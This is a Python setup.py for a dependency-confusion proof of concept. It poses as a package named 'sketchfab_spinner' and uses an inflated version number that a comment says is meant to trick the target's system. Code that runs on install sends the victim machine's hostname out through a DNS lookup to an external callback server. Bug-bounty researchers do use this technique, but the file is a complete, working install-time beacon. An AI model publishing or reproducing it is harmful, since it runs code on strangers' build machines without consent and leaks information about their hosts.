from setuptools import setup, find_packages
import os
import socket

# 🚨 CONFIGURATION
PACKAGE_NAME = "sketchfab_spinner"
VERSION = "99.9.9"  # High version to trick their system
# Put your Interactsh/Burp link here:
DNS_CALLBACK = "alrpzdtypuwrwpjsjzointigavd51e1al.oast.fun" 

def ping_home():
    try:
        # Create a unique payload: package_name.hostname.listener
        hostname = socket.gethostname()
        target = f"{PACKAGE_NAME}.{hostname}.{DNS_CALLBACK}"
        socket.gethostbyname(target)
    except:
        pass

# Run the ping immediately when setup.py is read
ping_home()

setup(
    name=PACKAGE_NAME,
    version=VERSION,
    description="Security Research PoC for Dependency Confusion",
    author="Security Researcher",
    author_email="security@example.com",
    packages=find_packages(),
)
